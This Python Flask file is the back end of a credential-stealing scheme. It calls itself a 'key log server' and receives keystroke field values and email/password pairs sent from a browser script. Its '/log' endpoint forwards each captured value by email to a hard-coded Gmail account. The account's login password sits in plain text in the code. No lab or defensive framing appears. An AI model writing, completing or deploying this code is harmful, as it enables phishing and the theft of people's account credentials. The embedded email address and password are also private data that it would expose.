from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import time
import smtplib
import ssl
from email.message import EmailMessage

app = Flask(__name__)
# CORS is required to allow the website (browser) to send
# data to this server (which is on a different 'origin')
CORS(app)

# Email configuration - EDIT THESE WITH YOUR CREDENTIALS
SENDER_EMAIL = "godfredfokuo199@gmail.com"
RECEIVER_EMAIL = "godfredfokuo199@gmail.com"
EMAIL_PASSWORD = "ahceygvaungmsjrg"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 465

def send_email(subject, body):
    """Send email with the captured data."""
    try:
        msg = EmailMessage()
        msg['Subject'] = subject
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg.set_content(body)
        
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT, context=context) as server:
            server.login(SENDER_EMAIL, EMAIL_PASSWORD)
            server.send_message(msg)
        
        print(f"Email sent successfully: {subject}")
        return True
    except Exception as e:
        print(f"Error sending email: {e}")
        return False

@app.route('/log', methods=['POST'])
def log_keystrokes():
    """
    This function is the '/log' endpoint. It waits for the
    JavaScript to send a POST request, then sends the data via email.
    """
    try:
        data = request.json
        timestamp = data.get('timestamp', time.strftime('%Y-%m-%d %H:%M:%S'))
        
        # Build email content based on data type
        if 'field' in data:
            # Individual field update
            subject = f"Field Update - {data['field']}"
            body = f"Timestamp: {timestamp}\nField: {data['field']}\nValue: {data['value']}"
            print(f"Received {data['field']}: {data['value']}")
            
        elif 'action' in data:
            # Action event (login attempt, page exit)
            subject = f"Login Action - {data['action']}"
            body = f"Timestamp: {timestamp}\nAction: {data['action']}\n\nEmail: {data.get('email', '')}\nPassword: {data.get('password', '')}"
            print(f"Received action: {data['action']}")
            
        else:
            # Generic data
            subject = "Website Data Captured"
            body = f"Timestamp: {timestamp}\n\nData:\n{json.dumps(data, indent=2)}"
            print(f"Received data: {data}")
        
        # Send email
        email_sent = send_email(subject, body)
        
        if email_sent:
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "email_failed"}), 500
        
    except Exception as e:
        print(f"Error processing data: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    print("Starting key log server at http://127.0.0.1:5000")
    print(f"Captured data will be sent to: {RECEIVER_EMAIL}")
    print("Press Ctrl+C to stop the server.")
    # Use 0.0.0.0 to accept connections from other devices on your network
    app.run(host='0.0.0.0', debug=True, port=5000)